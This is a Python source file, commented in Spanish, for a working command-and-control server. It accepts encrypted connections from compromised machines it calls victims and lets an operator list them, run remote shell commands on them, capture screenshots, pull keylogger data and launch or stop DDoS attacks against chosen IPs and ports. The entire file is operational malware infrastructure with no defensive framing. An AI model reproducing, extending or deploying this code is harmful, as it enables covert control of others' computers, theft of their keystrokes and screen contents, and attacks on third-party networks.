#!/usr/bin/env python3
import socket, threading, time, base64
from cripto import cifrar, descifrar

HOST, PORT = "0.0.0.0", 4444
clientes, lock, contador = [], threading.Lock(), [0]

def manejar_cliente(conn, addr):
    with lock:
        contador[0] += 1
        cid = contador[0]
    buffer = b""
    try:
        conn.settimeout(15)
        data = conn.recv(4096)
        if not data: return
        hostname = descifrar(data).strip()
        conn.settimeout(None)
        with lock:
            clientes.append({"id": cid, "conn": conn, "addr": addr, "host": hostname})
        print(f"\n[+] Víctima #{cid} conectada | {addr[0]} | host={hostname}")

        while True:
            data = conn.recv(8192)
            if not data: break
            buffer += data
            # Procesamos todos los paquetes que hayan llegado
            while b"\n" in buffer:
                linea, buffer = buffer.split(b"\n", 1)
                if not linea.strip(): continue
                try:
                    texto = descifrar(linea)
                    manejar_respuesta(cid, texto)
                except Exception as e:
                    print(f"[!] Error descifrando de #{cid}: {e}")
    except Exception as e:
        # Silenciamos el error de desconexión abrupta
        pass
    finally:
        with lock:
            clientes[:] = [c for c in clientes if c["id"] != cid]
        conn.close()
        print(f"[-] Víctima #{cid} desconectada")

def manejar_respuesta(cid, texto):
    if texto.startswith("SCREENSHOT_B64:"):
        b64 = texto[len("SCREENSHOT_B64:"):]
        try:
            with open(f"/tmp/shot_{cid}_{int(time.time())}.png", "wb") as f:
                f.write(base64.b64decode(b64))
            print(f"\n[+] Captura de #{cid} guardada en /tmp/")
        except Exception as e:
            print(f"\n[!] Error guardando imagen: {e}")
    else:
        # Imprime la salida de los comandos tal cual
        print(f"\n[{cid}] {texto}")

def enviar(cid, comando):
    with lock:
        objetivo = next((c for c in clientes if c["id"] == cid), None)
    if objetivo:
        try:
            objetivo["conn"].sendall(cifrar(comando))
        except Exception as e:
            print(f"[!] Error enviando a #{cid}: {e}")
    else:
        print(f"[!] No existe víctima #{cid}")

def menu():
    print("\n--- COMANDOS ---")
    print("list | use <id> <cmd> | screenshot <id> | keys <id> | ddos <id> <ip> <puerto> | stop_ddos <id> | exit\n")
    while True:
        try:
            linea = input("C2> ").strip()
            if not linea: continue
            # ELIMINAMOS EL LÍMITE DEL SPLIT PARA QUE AGARRE TODOS LOS ARGUMENTOS
            partes = linea.split() 
            cmd = partes[0].lower()

            if cmd == "list":
                with lock:
                    for c in clientes: print(f"  #{c['id']} | {c['addr'][0]} | host={c['host']}")
            elif cmd == "use" and len(partes) >= 3:
                # Unimos el comando por si tiene espacios (ej. ls -la /etc)
                comando_completo = " ".join(partes[2:])
                enviar(int(partes[1]), f"SHELL {comando_completo}")
            elif cmd == "screenshot" and len(partes) >= 2:
                enviar(int(partes[1]), "SCREENSHOT")
            elif cmd == "keys" and len(partes) >= 2:
                enviar(int(partes[1]), "KEYS")
            elif cmd == "ddos" and len(partes) >= 4:
                # partes[2] es la IP, partes[3] es el puerto
                enviar(int(partes[1]), f"DDOS {partes[2]} {partes[3]}")
            elif cmd == "stop_ddos" and len(partes) >= 2:
                enviar(int(partes[1]), "STOP_DDOS")
            elif cmd == "exit": 
                break
            else: 
                print("[!] Comando no reconocido o faltan argumentos.")
        except ValueError:
            print("[!] Error: El ID debe ser un número (ej. use 1 whoami).")
        except Exception as e:
            print(f"[!] Error en el menú: {e}")

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(10)
    print(f"[+] C2 escuchando en {HOST}:{PORT}")
    threading.Thread(target=menu, daemon=True).start()
    while True:
        try:
            conn, addr = s.accept()
            threading.Thread(target=manejar_cliente, args=(conn, addr), daemon=True).start()
        except KeyboardInterrupt: 
            print("\nCerrando servidor...")
            break

if __name__ == "__main__":
    main()
